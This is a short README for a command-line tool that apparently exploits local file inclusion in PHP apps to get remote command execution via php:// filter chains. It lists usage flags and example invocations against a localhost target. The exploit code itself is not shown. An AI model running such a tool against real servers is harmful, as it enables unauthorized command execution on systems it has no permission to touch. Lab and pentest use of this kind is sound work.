# PHPLFI2RCE

I wrote this while doing a LFI lab. It is based on https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters#full-script

I just made it usable via cli, just because who knows one day I might need it...

# Usage

```
args:
        -u <url>
        -p <param>
        -c <command to issue>
optional:
        -f <file to use (default php://temp)>
        -P <proxy (http,http://localhost:8080)>]
```

## Examples

If the LFI is on the parameter "file", in a URL such as in ```http://127.0.0.1/index.php?file=<LFI HERE>```, and you want to issue the command "id":


```
python3 phplfi2rce.py -u http://127.0.0.1/index.php -p file -c id
```

Add proxies if you need


```
python3 phplfi2rce.py -u http://127.0.0.1/index.php -p file -c id -P http,http://localhost:8080

```

Finally, you can use a different php:// file, the default is php://temp. Just use the -f parameter.

# Notes

This works only with GET parameters. If you need POST you'll need to modify the code. I'm too lazy to do it now.
